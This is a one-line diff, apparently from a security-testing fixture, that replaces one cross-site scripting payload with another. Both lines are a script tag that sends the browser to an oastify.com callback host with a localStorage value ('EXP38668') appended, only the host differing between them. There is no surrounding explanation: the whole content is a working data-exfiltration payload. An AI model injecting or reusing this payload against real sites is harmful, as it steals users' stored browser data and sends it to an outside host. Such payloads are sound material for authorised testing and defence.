@@ -1,1 +1,1 @@
-<script>document.location='http://76bs24fc3oc04j6o3n2l1f8nwe26qaez.oastify.com'+localStorage.getItem('EXP38668')</script>
+<script>document.location='http://sfb36x9volj1epz7hggc4yxm2d88wzko.oastify.com'+localStorage.getItem('EXP38668')</script>
